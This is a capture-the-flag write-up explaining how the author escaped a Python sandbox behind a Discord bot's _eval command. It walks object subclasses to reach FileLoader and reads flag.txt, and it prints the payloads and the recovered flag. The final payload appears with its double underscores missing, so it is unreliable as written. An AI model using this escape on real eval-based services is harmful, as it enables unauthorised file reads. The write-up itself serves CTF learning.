# Kieth Bot

TL;DR:
Get a list of available classes:
```python
_eval return "".join([ ( c.__name__.ljust(7,"\n")) for c in ().__class__.__base__.__subclasses__()]) 
```

Get the file:
```python
_eval return [c for c in ().class.base.subclasses() if c.name=="FileLoader"][0]("./flag.txt","./flag.txt").get_data("./flag.txt")
```
This one's real fun. It really makes you delve into the python docs.

So first, let's consider the one important command of this discord bot:

_eval

I used some help from previous writeups after a teammate found some and sent them to me. It helped confirm that I was going in the right direction.

Now, it doesn't mean that we can just copy and paste their solution. I'm in a rush so I'm going to skip over all of my experimenting and screwing about

The past writeups for similar problem tell us that we're looking to leverage some preset python attributes that are present in every class, along with an empty tuple (which will be the class we use as a jumping-off point) in order to get a class that we can use to read "flag.txt"

This bit here will give us a dict of a crap ton of subclasses, a few (or one) of which we can use to read the flag. This is where you can start if you read past similar writeups. The issue becomes getting a list of subclasses that we can use.
```python
().__class__.__base__.__subclasses__()
```
but we can't just take that and return it, beacuse if we do, the discord bot gives us nothing in response
```python 
_eval return ().__class__.__base__.__subclasses__() # nothing. no message in return
```
Now I suspect this is because the builtins are gone, and the dict is not getting stringified

We can't use str() to get a string out of it, because the builtins are gone (argh!)

So instead, we try to do the .toString() equivalent in python

```python 
_eval return ().__class__.__base__.__subclasses__().__str__() # nothing. no message in return
```
but this also returns nothing

there is an alternative function though called __repr__() that could return a string
```python 
_eval return ().__class__.__base__.__subclasses__().__repr__() # nothing. no message in return
```
Still, no response.

So after a lot of screwing around, I ended up with this:
```python
_eval return "".join([ ( c.__name__.ljust(7,"\n")) for c in ().__class__.__base__.__subclasses__()]) 
```
I figured out I can use .join after googling something along the lines of "PHP implode but for python" (basically JavaScript's unsplit)
Turns out, we can join arrays back into stirngs using the .join method. For some reason, I couldn't get any delimiter except for an empty string to work (hence `"".join...`)
I could also not figure out how to concat stuff within that weird array filtration thing, I even tried hacking .join but I couldn't get any meaningful delimiter. 
I didn't waste too much time doing this delimiter BS beacuse I ended up spotting "FileLoader". 

I looked at the docs for FileLoader and realized that it's a valid way to get a File from the system, and we can see the bytes using .get_data(). I didn't read the usage very well, but I was in aa rush so what the heck, we'll make all the paramters the same

So we do some array filtration to get the FileLoader class, we instantiate it and then we get the file containing the flag

```python 
_eval return [c for c in ().class.base.subclasses() if c.name=="FileLoader"][0]("./flag.txt","./flag.txt").get_data("./flag.txt")
```
b'hsctf{discord_bot_pyjail_uwu_030111}\n'

